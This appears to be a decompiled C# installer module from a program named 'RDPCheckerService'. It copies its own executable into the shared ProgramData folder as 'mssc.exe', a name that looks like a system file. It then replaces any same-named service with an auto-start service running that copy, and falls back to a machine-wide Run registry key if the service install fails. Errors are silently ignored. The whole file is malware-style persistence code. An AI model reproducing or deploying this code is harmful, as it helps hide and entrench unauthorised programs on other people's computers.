using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace RDPCheckerService_net;

public static class CheckerInstaller
{
	[DllImport("advapi32.dll")]
	public static extern IntPtr OpenSCManager(string lpMachineName, string lpSCDB, int scParameter);

	[DllImport("Advapi32.dll")]
	public static extern IntPtr CreateService(IntPtr SC_HANDLE, string lpSvcName, string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, int dwErrorControl, string lpPathName, string lpLoadOrderGroup, int lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);

	[DllImport("advapi32.dll")]
	public static extern void CloseServiceHandle(IntPtr SCHANDLE);

	[DllImport("advapi32.dll")]
	public static extern int StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern IntPtr OpenService(IntPtr SCHANDLE, string lpSvcName, int dwNumServiceArgs);

	[DllImport("advapi32.dll")]
	public static extern int DeleteService(IntPtr SVHANDLE);

	private static bool InstallService(string svcPath, string svcName, string svcDispName)
	{
		bool result = false;
		int scParameter = 983103;
		int dwServiceType = 16;
		int dwErrorControl = 1;
		int num = 983551;
		int dwStartType = 2;
		try
		{
			IntPtr intPtr = OpenSCManager(null, null, scParameter);
			if (intPtr != IntPtr.Zero)
			{
				IntPtr intPtr2 = OpenService(intPtr, svcName, num);
				if (intPtr2 != IntPtr.Zero)
				{
					DeleteService(intPtr2);
					CloseServiceHandle(intPtr2);
				}
				intPtr2 = CreateService(intPtr, svcName, svcDispName, num, dwServiceType, dwStartType, dwErrorControl, svcPath + " -svc", null, 0, null, null, null);
				if (intPtr2 != IntPtr.Zero)
				{
					StartService(intPtr2, 0, null);
					result = true;
					CloseServiceHandle(intPtr2);
				}
				CloseServiceHandle(intPtr);
				return result;
			}
			return result;
		}
		catch
		{
			return false;
		}
	}

	private static void InstalToRegistry(string svcPath, string svcName)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey != null)
			{
				registryKey.SetValue(svcName, svcPath + " -reg");
				registryKey.Close();
				Process.Start(svcPath, "-reg");
			}
		}
		catch
		{
		}
	}

	public static void Install(string svcName, string svcDisplayName)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
		string text = Path.Combine(folderPath, "mssc.exe");
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		File.Copy(fileName, text);
		if (!InstallService(text, svcName, svcDisplayName))
		{
			InstalToRegistry(text, svcDisplayName);
		}
	}
}
